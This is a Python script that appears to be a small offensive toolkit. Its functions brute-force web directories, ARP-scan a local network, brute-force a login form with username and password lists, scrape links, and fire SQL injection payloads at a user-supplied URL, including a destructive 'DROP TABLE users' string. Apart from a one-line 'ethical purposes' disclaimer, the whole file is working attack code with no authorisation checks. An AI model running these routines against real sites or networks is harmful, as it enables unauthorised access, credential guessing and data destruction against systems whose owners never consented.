import requests
import os
import sys
import socket
import ipaddress
import time
from scapy.all import ARP, Ether, srp
from bs4 import BeautifulSoup

print("[+] Use Only for ethical purpuses")

def brute_force_directories():
    url=input("[+] Please Enter the URL of the Target Website: ")
    worlist = "common.txt" #Replace with the name of you wordlist file
    
    with open(worlist, 'r') as f:
        directories = f.read().splitlines()
        
    for directory in directories:
        target_url = f"{url}/{directory}"
        response = requests.get(target_url)
        
        if response.status_code == 200:
            print(f"[+] Found directory: {target_url}")
        elif response.status_code == 403:
            print(f"[+] Access forbidden: {target_url}")
        elif response.status_code == 404:
            print(f"[+] Not found: {target_url}")
        
def scan_network():
    if os.geteuid() != 0:
        print("[+] This script must be run as root. Please call command with sudo")
        sys.exit()
    
    network_range = input("[+] Enter the network range (e.g.: 192.168.1.0/24): ")
    port_range = [1, 21, 22, 80, 443]
    
    arp = ARP(pdst=network_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp
    result = srp(packet, timeout=2, verbose=False)[0]
    
    for sent, received in result:
        print(f"[+] Device IP: {received.psrc}, MAC: {received.hwsrc}")
    
    
def brute_force_login():
    url = input("[+] Enter the URL of the login page: ")
    username_file = "usernames.txt" # Replace with file with list of usernames
    password_file = "passwords.txt" # Replace with file with list of common passwords
    
    with open(username_file, 'r') as uf:
        usernames = uf.read().strip().splitlines()
        
    with open(password_file, 'r') as pf:
        passwords = pf.read().strip().splitlines()
        
    for username in usernames:
        for password in passwords:
            login_data = {'username': username, 'password': password, 'submit': 'login'}
            response = requests.post(url, data=login_data)
            if 'Login failed' not in response.text:
                print(f"[+] Login successful with username: {username} and password: {password}")
                return
    
def scrape_website():
    url = input("[+] Enter the website URL to scrape: ")
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    
    for a_tag in soup.find_all('a', href=True):
        print(f"Title: {a_tag.get_text().strip()}, Link: {a_tag['href']}")
        

def scan_sql_injection():
    url = input("[+] Enter the target URL: ")
    payloads = ["'" , "1' OR '1'='1", "1'; DROP TABLE users; --"]
    
    for payload in payloads:
        test_url = f"{url}{payload}"
        response = requests.get(test_url)
        
        if any(keyword in response.text for keyword in ['SQL syntax', 'mysql', 'error']):
            print(f"[+] Vulnerable to SQL Injection: {test_url}")
            

